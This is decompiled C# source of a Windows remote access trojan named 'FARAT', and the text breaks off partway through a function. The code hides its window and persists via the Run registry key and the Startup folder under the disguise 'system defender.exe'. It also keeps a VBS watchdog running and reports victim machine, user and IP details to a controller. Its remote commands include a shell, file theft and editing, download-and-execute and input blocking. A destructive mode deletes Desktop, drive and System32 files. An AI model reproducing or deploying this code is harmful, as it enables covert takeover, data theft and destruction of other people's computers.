using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using FARATCLIENT.Properties;
using Microsoft.Win32;
using Resolution;

namespace FARATCLIENT
{
	// Token: 0x02000006 RID: 6
	public partial class Form1 : Form
	{
		// Token: 0x06000012 RID: 18 RVA: 0x000023C8 File Offset: 0x000005C8
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00006F70 File Offset: 0x00005170
		public static bool AntivirusInstalled()
		{
			string scope = "\\\\" + Environment.MachineName + "\\root\\SecurityCenter";
			bool result;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, "SELECT * FROM AntivirusProduct");
				ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
				result = (managementObjectCollection.Count > 0);
				return result;
			}
			catch
			{
			}
			result = false;
			return result;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x0000724C File Offset: 0x0000544C
		private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				while (this.antiKiller)
				{
					Process[] processesByName = Process.GetProcessesByName("wscript");
					bool flag = processesByName.Length == 0;
					if (flag)
					{
						bool flag2 = File.Exists(Path.GetTempPath() + "systemse.vbs");
						if (flag2)
						{
							File.Delete(Path.GetTempPath() + "systemse.vbs");
						}
						File.Create(Path.GetTempPath() + "systemse.vbs").Dispose();
						File.WriteAllText(Path.GetTempPath() + "systemse.vbs", Resources.wscript);
						Process.Start(Path.GetTempPath() + "systemse.vbs");
						bool flag3 = true;
						while (flag3)
						{
							Process[] processesByName2 = Process.GetProcessesByName("wscript");
							bool flag4 = processesByName2.Length == 0;
							if (flag4)
							{
								Thread.Sleep(1000);
							}
							else
							{
								flag3 = false;
							}
						}
					}
					else
					{
						bool flag5 = processesByName.Length > 1;
						if (flag5)
						{
							processesByName[0].Kill();
							processesByName[0].WaitForExit();
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600000E RID: 14
		[DllImport("user32.dll")]
		private static extern bool BlockInput(bool block);

		// Token: 0x06000015 RID: 21 RVA: 0x00002525 File Offset: 0x00000725
		private void button1_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002525 File Offset: 0x00000725
		private void button2_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00006E30 File Offset: 0x00005030
		private void cmd_DataReceived(object sender, DataReceivedEventArgs e)
		{
			try
			{
				this.sendMessage("Shell: " + e.Data);
				Thread.Sleep(500);
			}
			catch
			{
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00006F30 File Offset: 0x00005130
		private void cmd_Error(object sender, DataReceivedEventArgs e)
		{
			try
			{
				this.sendMessage("Shell Error: " + e.Data);
			}
			catch
			{
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00007028 File Offset: 0x00005228
		private void copyDirectory(string strSource, string strDestination)
		{
			bool flag = !Directory.Exists(strDestination);
			if (flag)
			{
				Directory.CreateDirectory(strDestination);
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(strSource);
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo fileInfo = array[i];
				fileInfo.CopyTo(Path.Combine(strDestination, fileInfo.Name));
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			DirectoryInfo[] array2 = directories;
			for (int j = 0; j < array2.Length; j++)
			{
				DirectoryInfo directoryInfo2 = array2[j];
				this.copyDirectory(Path.Combine(strSource, directoryInfo2.Name), Path.Combine(strDestination, directoryInfo2.Name));
			}
		}

		// Token: 0x06000018 RID: 24
		[DllImport("dnsapi.dll")]
		private static extern uint DnsFlushResolverCache();

		// Token: 0x06000019 RID: 25 RVA: 0x00002630 File Offset: 0x00000830
		private void Form1_Load(object sender, EventArgs e)
		{
			base.Hide();
			base.ShowInTaskbar = false;
			try
			{
				Thread.Sleep(1000);
				bool flag = ApplicationRunningHelper.AlreadyRunning();
				if (flag)
				{
					Process.GetCurrentProcess().Kill();
				}
				Process[] processesByName = Process.GetProcessesByName("wscript");
				bool flag2 = processesByName.Length == 0;
				if (flag2)
				{
					bool flag3 = File.Exists(Path.GetTempPath() + "systemse.vbs");
					if (flag3)
					{
						File.Delete(Path.GetTempPath() + "systemse.vbs");
					}
					File.Create(Path.GetTempPath() + "systemse.vbs").Dispose();
					File.WriteAllText(Path.GetTempPath() + "systemse.vbs", Resources.wscript);
					Process.Start(Path.GetTempPath() + "systemse.vbs");
				}
			}
			catch
			{
			}
			object argument = new object();
			this.backgroundWorker1.RunWorkerAsync(argument);
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetDirectoryName(Application.ExecutablePath));
				foreach (FileInfo current in directoryInfo.EnumerateFiles())
				{
					bool flag4 = current.ToString().Contains("TempFile");
					if (flag4)
					{
						try
						{
							File.Delete(current.ToString());
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			Random random = new Random();
			int iD = random.Next(1, 10000);
			this.ID = iD;
			bool flag5 = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\system defender.exe");
			if (!flag5)
			{
				try
				{
					File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ATI\\system defender.exe");
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
					registryKey.SetValue("system defender", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ATI\\system defender.exe");
				}
				catch
				{
				}
				try
				{
					File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\system defender.exe");
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\system defender.exe");
					Process.GetCurrentProcess().Kill();
				}
				catch
				{
				}
			}
			this.trytoconnect();
		}

		// Token: 0x0600000F RID: 15
		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x06000013 RID: 19 RVA: 0x00002438 File Offset: 0x00000638
		private void getMessage()
		{
			try
			{
				while (true)
				{
					this.serverStream = this.clientSocket.GetStream();
					byte[] array = new byte[10025];
					int receiveBufferSize = this.clientSocket.ReceiveBufferSize;
					this.serverStream.Read(array, 0, receiveBufferSize);
					string @string = Encoding.ASCII.GetString(array);
					this.readData = (@string ?? "");
					this.msg();
				}
			}
			catch
			{
				Process.GetCurrentProcess().Kill();
			}
		}

		// Token: 0x06000010 RID: 16
		[DllImport("user32.dll")]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		// Token: 0x06000011 RID: 17
		[DllImport("winmm.dll")]
		public static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);

		// Token: 0x06000014 RID: 20 RVA: 0x000024CC File Offset: 0x000006CC
		private void msg()
		{
			bool invokeRequired = base.InvokeRequired;
			if (invokeRequired)
			{
				base.Invoke(new MethodInvoker(this.msg));
			}
			else
			{
				this.textBox1.Text = this.textBox1.Text + Environment.NewLine + " >> " + this.readData;
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00006E7C File Offset: 0x0000507C
		private void sendMessage(string Message)
		{
			try
			{
				Message.Replace("$", "");
				byte[] bytes = Encoding.ASCII.GetBytes(Message + "$");
				this.serverStream.Write(bytes, 0, bytes.Length);
				this.serverStream.Flush();
			}
			catch (Exception arg)
			{
				try
				{
					byte[] bytes2 = Encoding.ASCII.GetBytes(arg + "$");
					this.serverStream.Write(bytes2, 0, bytes2.Length);
					this.serverStream.Flush();
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600001F RID: 31
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool SetSystemTime(ref Form1.SYSTEMTIME st);

		// Token: 0x0600001B RID: 27 RVA: 0x000028DC File Offset: 0x00000ADC
		private void textBox1_TextChanged(object sender, EventArgs e)
		{
			bool flag = this.textBox1.Text.Contains(") change your name to: [");
			if (flag)
			{
				try
				{
					string a = this.textBox1.Text.Split(new char[]
					{
						'(',
						')'
					})[1];
					try
					{
						this.myIP = this.textBox1.Text.Split(new char[]
						{
							'_',
							'/'
						})[1];
					}
					catch
					{
					}
					bool flag2 = a == this.vicname;
					if (flag2)
					{
						string text = this.textBox1.Text.Split(new char[]
						{
							'[',
							']'
						})[1];
						this.vicname = text;
						string text2 = "UNKNOWN";
						string text3 = "UNKNOWN";
						string text4 = "UNKNOWN";
						try
						{
							text2 = Environment.MachineName;
						}
						catch
						{
						}
						try
						{
							text3 = WindowsIdentity.GetCurrent().Name;
						}
						catch
						{
						}
						try
						{
							text4 = Environment.OSVersion.ToString();
						}
						catch
						{
						}
						this.sendMessage(string.Concat(new string[]
						{
							"Victume! My Name Is: (",
							this.vicname,
							"), OS: [",
							text4,
							"], PC Name: { ",
							text2,
							"} ,PC Username: &",
							text3,
							" &,IP: *",
							this.myIP,
							" * "
						}));
					}
				}
				catch (Exception ex)
				{
					this.sendMessage("Error:" + ex.Message);
				}
			}
			bool flag3 = this.textBox1.Text.Contains("check clients");
			if (flag3)
			{
				try
				{
					string text5 = "UNKNOWN";
					string text6 = "UNKNOWN";
					string text7 = "UNKNOWN";
					try
					{
						text5 = Environment.MachineName;
					}
					catch
					{
					}
					try
					{
						text6 = WindowsIdentity.GetCurrent().Name;
					}
					catch
					{
					}
					try
					{
						text7 = Environment.OSVersion.ToString();
					}
					catch
					{
					}
					try
					{
						Assembly executingAssembly = Assembly.GetExecutingAssembly();
						FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(executingAssembly.Location);
						string fileVersion = versionInfo.FileVersion;
					}
					catch
					{
					}
					this.sendMessage(string.Concat(new string[]
					{
						"Victume! My Name Is: (",
						this.vicname,
						"), OS: [",
						text7,
						"], PC Name: {",
						text5,
						"} ,PC Username: &",
						text6,
						"&,IP: *",
						this.myIP,
						"*"
					}));
				}
				catch (Exception ex2)
				{
					this.sendMessage("Error:" + ex2.Message);
				}
			}
			bool flag4 = this.textBox1.Text.Contains("|");
			if (flag4)
			{
				string a2 = this.textBox1.Text.Split(new char[]
				{
					'|',
					'|'
				})[1];
				bool flag5 = a2 == this.vicname || a2 == "ALL";
				if (flag5)
				{
					bool flag6 = this.textBox1.Text.Contains("show messagebox");
					if (flag6)
					{
						try
						{
							string text8 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string caption = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							MessageBox.Show(text8, caption);
							this.sendMessage(" MessageBox successfully shows");
						}
						catch (Exception ex3)
						{
							this.sendMessage("Error:" + ex3.Message);
						}
					}
					bool flag7 = this.textBox1.Text.Contains("get ipaddress");
					if (flag7)
					{
						try
						{
							this.sendMessage("IPAddress is <" + this.myIP + "> ");
						}
						catch (Exception ex4)
						{
							this.sendMessage("Error:" + ex4.Message);
						}
					}
					bool flag8 = this.textBox1.Text.Contains("kill server");
					if (flag8)
					{
						try
						{
							this.antiKiller = false;
							Process[] processesByName = Process.GetProcessesByName("wscript");
							processesByName[0].Kill();
							Process.GetCurrentProcess().Kill();
						}
						catch (Exception ex5)
						{
							this.sendMessage("Error:" + ex5.Message);
						}
					}
					bool flag9 = this.textBox1.Text.Contains("check disks");
					if (flag9)
					{
						try
						{
							DriveInfo[] drives = DriveInfo.GetDrives();
							string text9 = "";
							DriveInfo[] array = drives;
							for (int i = 0; i < array.Length; i++)
							{
								DriveInfo driveInfo = array[i];
								try
								{
									string text10 = "";
									try
									{
										text10 = driveInfo.TotalSize.ToString();
									}
									catch
									{
									}
									text9 = string.Concat(new object[]
									{
										text9,
										"Disk: [",
										driveInfo,
										"] Size: {",
										text10,
										"} Byte<"
									});
								}
								catch (Exception ex6)
								{
									this.sendMessage("Error:" + ex6.Message);
								}
							}
							this.sendMessage(text9 ?? "");
						}
						catch (Exception ex7)
						{
							this.sendMessage("Error:" + ex7.Message);
						}
					}
					bool flag10 = this.textBox1.Text.Contains("get file browser info");
					if (flag10)
					{
						try
						{
							string path = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							string text11 = "";
							try
							{
								DirectoryInfo directoryInfo = new DirectoryInfo(path);
								DirectoryInfo[] directories = directoryInfo.GetDirectories();
								for (int j = 0; j < directories.Length; j++)
								{
									DirectoryInfo directoryInfo2 = directories[j];
									try
									{
										text11 = string.Concat(new object[]
										{
											text11,
											"(DIR()",
											directoryInfo2,
											"){{<"
										});
									}
									catch (Exception ex8)
									{
										this.sendMessage("Error:" + ex8.Message);
									}
								}
							}
							catch (Exception ex9)
							{
								this.sendMessage("Error:" + ex9.Message);
							}
							try
							{
								DirectoryInfo directoryInfo3 = new DirectoryInfo(path);
								foreach (FileInfo current in directoryInfo3.EnumerateFiles())
								{
									try
									{
										text11 = string.Concat(new object[]
										{
											text11,
											"(",
											current.Extension,
											"()",
											current,
											"){",
											current.Length,
											"{<"
										});
									}
									catch (Exception ex10)
									{
										this.sendMessage("Error:" + ex10.Message);
									}
								}
								DriveInfo[] drives2 = DriveInfo.GetDrives();
								DriveInfo[] array2 = drives2;
								for (int k = 0; k < array2.Length; k++)
								{
									DriveInfo driveInfo2 = array2[k];
									try
									{
										try
										{
											string text12 = driveInfo2.TotalSize.ToString();
										}
										catch
										{
										}
										text11 = string.Concat(new object[]
										{
											text11,
											"Disk: [",
											driveInfo2,
											"]<"
										});
									}
									catch
									{
									}
								}
							}
							catch (Exception ex11)
							{
								this.sendMessage("Error:" + ex11.Message);
							}
							this.sendMessage(("Folder and Files: " + text11) ?? "");
						}
						catch (Exception ex12)
						{
							this.sendMessage("Error:" + ex12.Message);
						}
					}
					bool flag11 = this.textBox1.Text.Contains("get process list");
					if (flag11)
					{
						try
						{
							Process[] processes = Process.GetProcesses();
							string text13 = "";
							Process[] array3 = processes;
							for (int l = 0; l < array3.Length; l++)
							{
								Process process = array3[l];
								text13 = string.Concat(new object[]
								{
									text13,
									"Process Name: (",
									process.ProcessName,
									") ID: [",
									process.Id,
									"]<"
								});
							}
							this.sendMessage(text13);
							Thread.Sleep(500);
						}
						catch (Exception ex13)
						{
							this.sendMessage("Error:" + ex13.Message);
						}
					}
					bool flag12 = this.textBox1.Text.Contains("kill process");
					if (flag12)
					{
						try
						{
							string text14 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							Process[] processesByName2 = Process.GetProcessesByName(text14);
							processesByName2[0].Kill();
							this.sendMessage("Process Name:" + text14 + " has successfully killed");
						}
						catch (Exception ex14)
						{
							this.sendMessage("Error:" + ex14.Message);
						}
					}
					bool flag13 = this.textBox1.Text.Contains("kill list process");
					if (flag13)
					{
						try
						{
							int num = 0;
							int num2 = -1;
							string text15 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							text15 = text15.Replace("<", Environment.NewLine);
							this.richTextBox1.Text = text15;
							string[] array4 = this.richTextBox1.Text.Split(Environment.NewLine.ToCharArray());
							string[] array5 = array4;
							for (int m = 0; m < array5.Length; m++)
							{
								string processName = array5[m];
								try
								{
									Process[] processesByName3 = Process.GetProcessesByName(processName);
									processesByName3[0].Kill();
									int num3 = num;
									num = num3 + 1;
								}
								catch
								{
									int num3 = num2;
									num2 = num3 + 1;
								}
							}
							this.sendMessage(num.ToString() + " Process has successfully killed And " + num2.ToString() + " Failed");
						}
						catch (Exception ex15)
						{
							this.sendMessage("Error:" + ex15.Message);
						}
					}
					bool flag14 = this.textBox1.Text.Contains("get pc name");
					if (flag14)
					{
						try
						{
							this.sendMessage("NetworkName/User Name is (" + WindowsIdentity.GetCurrent().Name + ")");
						}
						catch (Exception ex16)
						{
							this.sendMessage("Error:" + ex16.Message);
						}
					}
					bool flag15 = this.textBox1.Text.Contains("get active window");
					if (flag15)
					{
						try
						{
							StringBuilder stringBuilder = new StringBuilder(256);
							IntPtr foregroundWindow = Form1.GetForegroundWindow();
							bool flag16 = Form1.GetWindowText(foregroundWindow, stringBuilder, 256) > 0;
							if (flag16)
							{
								stringBuilder.ToString();
								this.sendMessage("the current active window: " + stringBuilder);
							}
						}
						catch (Exception ex17)
						{
							this.sendMessage("Error:" + ex17.Message);
						}
					}
					bool flag17 = this.textBox1.Text.Contains("start streaming screen");
					if (flag17)
					{
						try
						{
							Form2 form = new Form2();
							form.Show();
							this.sendMessage("Stream Started");
						}
						catch (Exception ex18)
						{
							this.sendMessage("Error:" + ex18.Message);
						}
					}
					bool flag18 = this.textBox1.Text.Contains("stop streaming screen");
					if (flag18)
					{
						try
						{
							this.sendMessage("restarting server");
							Process.GetCurrentProcess().Kill();
						}
						catch (Exception ex19)
						{
							this.sendMessage("Error:" + ex19.Message);
						}
					}
					bool flag19 = this.textBox1.Text.Contains("restart server");
					if (flag19)
					{
						try
						{
							this.sendMessage("Server Restarting...");
							Process.GetCurrentProcess().Kill();
						}
						catch (Exception ex20)
						{
							this.sendMessage("Error:" + ex20.Message);
						}
					}
					bool flag20 = this.textBox1.Text.Contains("download file");
					if (flag20)
					{
						try
						{
							string fILENAME = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string sHORTFILENAME = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							Form3 form2 = new Form3(fILENAME, sHORTFILENAME);
							form2.Show();
							this.sendMessage("Form Opened");
						}
						catch (Exception ex21)
						{
							this.sendMessage("Error:" + ex21.Message);
						}
					}
					bool flag21 = this.textBox1.Text.Contains("pc shutdown");
					if (flag21)
					{
						try
						{
							this.sendMessage("Pc will shutdown");
							Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
							{
								CreateNoWindow = true,
								UseShellExecute = false
							});
						}
						catch (Exception ex22)
						{
							this.sendMessage("Error:" + ex22.Message);
						}
					}
					bool flag22 = this.textBox1.Text.Contains("pc restart");
					if (flag22)
					{
						try
						{
							this.sendMessage("Pc will restart");
							Process.Start("shutdown.exe", "-r -t 0");
						}
						catch (Exception ex23)
						{
							this.sendMessage("Error:" + ex23.Message);
						}
					}
					bool flag23 = this.textBox1.Text.Contains("block input");
					if (flag23)
					{
						try
						{
							string a3 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							bool flag24 = a3 == "ON";
							if (flag24)
							{
								Form1.BlockInput(true);
								this.sendMessage("Mouse And Keyboard has successfully blocked");
							}
							bool flag25 = a3 == "OFF";
							if (flag25)
							{
								Form1.BlockInput(false);
								this.sendMessage("Mouse And Keyboard has successfully unblocked");
							}
						}
						catch (Exception ex24)
						{
							this.sendMessage("Error:" + ex24.Message);
						}
					}
					bool flag26 = this.textBox1.Text.Contains("run file");
					if (flag26)
					{
						try
						{
							string text16 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							Process.Start(text16);
							this.sendMessage(text16 + " has successfully started");
						}
						catch (Exception ex25)
						{
							this.sendMessage("Error:" + ex25.Message);
						}
					}
					bool flag27 = this.textBox1.Text.Contains("upload file");
					if (flag27)
					{
						try
						{
							WebClient webClient = new WebClient();
							string address = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string text17 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							webClient.DownloadFile(address, Path.GetDirectoryName(Application.ExecutablePath) + "\\" + text17);
							this.sendMessage(text17 + " has successfully uploaded");
						}
						catch (Exception ex26)
						{
							this.sendMessage("Error:" + ex26.Message);
						}
					}
					bool flag28 = this.textBox1.Text.Contains("delete file");
					if (flag28)
					{
						try
						{
							string text18 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							File.Delete(text18);
							this.sendMessage(text18 + " has successfully deleted");
						}
						catch (Exception ex27)
						{
							this.sendMessage("Error:" + ex27.Message);
						}
					}
					bool flag29 = this.textBox1.Text.Contains("read file");
					if (flag29)
					{
						try
						{
							string path2 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							string str = File.ReadAllText(path2, Encoding.UTF8);
							this.sendMessage("\n" + str);
						}
						catch (Exception ex28)
						{
							this.sendMessage("Error:" + ex28.Message);
						}
					}
					bool flag30 = this.textBox1.Text.Contains("rename file");
					if (flag30)
					{
						try
						{
							string text19 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string text20 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							File.Move(text19, text20);
							this.sendMessage(text19 + " has successfully  changed to: " + text20);
						}
						catch (Exception ex29)
						{
							this.sendMessage("Error:" + ex29.Message);
						}
					}
					bool flag31 = this.textBox1.Text.Contains("copy file");
					if (flag31)
					{
						try
						{
							string text21 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string text22 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							File.Copy(text21, text22);
							this.sendMessage(text21 + " has successfully Copyed to: " + text22);
						}
						catch (Exception ex30)
						{
							this.sendMessage("Error:" + ex30.Message);
						}
					}
					bool flag32 = this.textBox1.Text.Contains("copy folder");
					if (flag32)
					{
						try
						{
							string text23 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string text24 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							this.copyDirectory(text23, text24);
							this.sendMessage(text23 + " Folder has successfully Copyed to: " + text24);
						}
						catch (Exception ex31)
						{
							this.sendMessage("Error:" + ex31.Message);
						}
					}
					bool flag33 = this.textBox1.Text.Contains("delete folder");
					if (flag33)
					{
						try
						{
							string text25 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							Directory.Delete(text25, true);
							this.sendMessage(text25 + " Folder has successfully Deleted ");
						}
						catch (Exception ex32)
						{
							this.sendMessage("Error:" + ex32.Message);
						}
					}
					bool flag34 = this.textBox1.Text.Contains("make folder");
					if (flag34)
					{
						try
						{
							string text26 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							Directory.CreateDirectory(text26);
							this.sendMessage(text26 + " Folder has successfully Created ");
						}
						catch (Exception ex33)
						{
							this.sendMessage("Error:" + ex33.Message);
						}
					}
					bool flag35 = this.textBox1.Text.Contains("make file");
					if (flag35)
					{
						try
						{
							string text27 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							File.Create(text27).Dispose();
							this.sendMessage(text27 + " File has successfully Created ");
						}
						catch (Exception ex34)
						{
							this.sendMessage("Error:" + ex34.Message);
						}
					}
					bool flag36 = this.textBox1.Text.Contains("edit file");
					if (flag36)
					{
						try
						{
							string text28 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string text29 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							try
							{
								text29 = text29.Replace("|", Environment.NewLine);
							}
							catch
							{
							}
							File.WriteAllText(text28, text29);
							this.sendMessage(text28 + " File has successfully Edited To:\n" + text29);
						}
						catch (Exception ex35)
						{
							this.sendMessage("Error:" + ex35.Message);
						}
					}
					bool flag37 = this.textBox1.Text.Contains("cd player");
					if (flag37)
					{
						try
						{
							string a4 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							bool flag38 = a4 == "open";
							if (flag38)
							{
								Form1.mciSendStringA("set CDAudio door open", this.rt, 127L, 0L);
								this.sendMessage("CD Player has successfully Opened");
							}
							bool flag39 = a4 == "close";
							if (flag39)
							{
								Form1.mciSendStringA("set CDAudio door closed", this.rt, 127L, 0L);
								this.sendMessage("CD Player has successfully Closed");
							}
						}
						catch (Exception ex36)
						{
							this.sendMessage("Error:" + ex36.Message);
						}
					}
					bool flag40 = this.textBox1.Text.Contains("run script");
					if (flag40)
					{
						try
						{
							string text30 = this.textBox1.Text.Split(new char[]
							{
								'&',
								'&'
							})[1];
							text30 = text30.Replace("<", Environment.NewLine);
							string text31 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							bool flag41 = text31 == "bat";
							if (flag41)
							{
								try
								{
									Random random = new Random();
									string text32 = "TempFile" + random.Next(1, 10000).ToString() + ".bat";
									File.Create(text32).Dispose();
									File.WriteAllText(text32, text30);
									Process.Start(text32);
									this.sendMessage("Your " + text31 + " script has successfully Started, With the name: " + text32);
								}
								catch (Exception ex37)
								{
									this.sendMessage("Error:" + ex37.Message);
								}
							}
							bool flag42 = text31 == "vbs";
							if (flag42)
							{
								try
								{
									Random random2 = new Random();
									string text33 = "TempFile" + random2.Next(1, 10000).ToString() + ".vbs";
									File.Create(text33).Dispose();
									File.WriteAllText(text33, text30);
									Process.Start(text33);
									this.sendMessage("Your " + text31 + " script has successfully Started, With the name: " + text33);
								}
								catch (Exception ex38)
								{
									this.sendMessage("Error:" + ex38.Message);
								}
							}
						}
						catch (Exception ex39)
						{
							this.sendMessage("Error:" + ex39.Message);
						}
					}
					bool flag43 = this.textBox1.Text.Contains("update server");
					if (flag43)
					{
						try
						{
							WebClient webClient2 = new WebClient();
							string address2 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string text34 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							webClient2.DownloadFile(address2, Path.GetDirectoryName(Application.ExecutablePath) + "\\" + text34);
							Process.Start(text34);
							this.sendMessage(text34 + " server has successfully started");
						}
						catch (Exception ex40)
						{
							this.sendMessage("Error:" + ex40.Message);
						}
					}
					bool flag44 = this.textBox1.Text.Contains("edit registry");
					if (flag44)
					{
						try
						{
							string text35 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							string name = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							string value = this.textBox1.Text.Split(new char[]
							{
								'<',
								'>'
							})[1];
							RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text35, true);
							bool flag45 = registryKey != null;
							if (flag45)
							{
								registryKey.SetValue(name, value, RegistryValueKind.String);
								registryKey.Close();
							}
							this.sendMessage(text35 + " successfully changed");
						}
						catch (Exception ex41)
						{
							this.sendMessage("Error:" + ex41.Message);
						}
					}
					bool flag46 = this.textBox1.Text.Contains("get server path");
					if (flag46)
					{
						try
						{
							this.sendMessage("The FARAT Server is located on : " + Path.GetDirectoryName(Application.ExecutablePath));
						}
						catch (Exception ex42)
						{
							this.sendMessage("Error:" + ex42.Message);
						}
					}
					bool flag47 = this.textBox1.Text.Contains("get screen resolution");
					if (flag47)
					{
						try
						{
							Screen primaryScreen = Screen.PrimaryScreen;
							int width = primaryScreen.Bounds.Width;
							int height = primaryScreen.Bounds.Height;
							this.sendMessage("User Resolution is " + width.ToString() + " X " + height.ToString());
						}
						catch (Exception ex43)
						{
							this.sendMessage("Error:" + ex43.Message);
						}
					}
					bool flag48 = this.textBox1.Text.Contains("set screen resolution");
					if (flag48)
					{
						try
						{
							string s = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							string s2 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							int num4 = int.Parse(s);
							int b = int.Parse(s2);
							CResolution cResolution = new CResolution(num4, b);
							this.sendMessage(string.Concat(new object[]
							{
								"User Resolution has set to: Height: ",
								num4,
								" Width: ",
								num4
							}) ?? "");
						}
						catch (Exception ex44)
						{
							this.sendMessage("Error:" + ex44.Message);
						}
					}
					bool flag49 = this.textBox1.Text.Contains("run favirus level");
					if (flag49)
					{
						try
						{
							string text36 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							bool flag50 = text36 == "1";
							if (flag50)
							{
								DirectoryInfo directoryInfo4 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
								DirectoryInfo[] directories2 = directoryInfo4.GetDirectories();
								for (int n = 0; n < directories2.Length; n++)
								{
									DirectoryInfo directoryInfo5 = directories2[n];
									try
									{
										directoryInfo5.Delete(true);
									}
									catch
									{
									}
								}
								foreach (string current2 in Directory.EnumerateFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
								{
									try
									{
										File.Delete(current2);
									}
									catch
									{
									}
								}
								DriveInfo[] drives3 = DriveInfo.GetDrives();
								DriveInfo[] array6 = drives3;
								for (int num5 = 0; num5 < array6.Length; num5++)
								{
									DriveInfo driveInfo3 = array6[num5];
									DirectoryInfo directoryInfo6 = new DirectoryInfo(driveInfo3.ToString());
									DirectoryInfo[] directories3 = directoryInfo6.GetDirectories();
									for (int num6 = 0; num6 < directories3.Length; num6++)
									{
										DirectoryInfo directoryInfo7 = directories3[num6];
										try
										{
											directoryInfo7.Delete(true);
										}
										catch
										{
										}
									}
								}
							}
							bool flag51 = text36 == "2";
							if (flag51)
							{
								Process[] processes2 = Process.GetProcesses();
								Process[] array7 = processes2;
								for (int num7 = 0; num7 < array7.Length; num7++)
								{
									Process process2 = array7[num7];
									Process[] processesByName4 = Process.GetProcessesByName(process2.ProcessName);
									bool flag52 = processesByName4 == Process.GetProcessesByName("system defender") || processesByName4 == Process.GetProcessesByName("wscript");
									if (!flag52)
									{
										try
										{
											processesByName4[0].Kill();
										}
										catch
										{
										}
									}
								}
							}
							bool flag53 = text36 == "3";
							if (flag53)
							{
								try
								{
									string systemDirectory = Environment.SystemDirectory;
									foreach (string current3 in Directory.EnumerateFiles(systemDirectory))
									{
										File.Delete(current3);
									}
									DirectoryInfo directoryInfo8 = new DirectoryInfo(systemDirectory);
									DirectoryInfo[] directories4 = directoryInfo8.GetDirectories();
